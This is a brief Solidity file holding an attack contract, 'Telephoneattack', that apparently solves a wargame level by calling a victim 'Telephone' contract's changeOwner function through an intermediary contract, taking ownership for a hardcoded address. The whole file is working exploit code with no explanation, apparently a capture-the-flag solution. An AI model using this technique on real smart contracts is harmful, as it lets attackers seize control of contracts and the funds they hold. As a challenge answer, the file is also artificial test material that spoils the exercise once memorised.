// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Telephoneattack {
Telephone public victimContract;

constructor (address _victimContractAddress) public {
    victimContract = Telephone(_victimContractAddress);
}

function changeOwner() public {
victimContract.changeOwner(0x513417e1393a08b6E9D882cafE191086F131d7E1);
}
}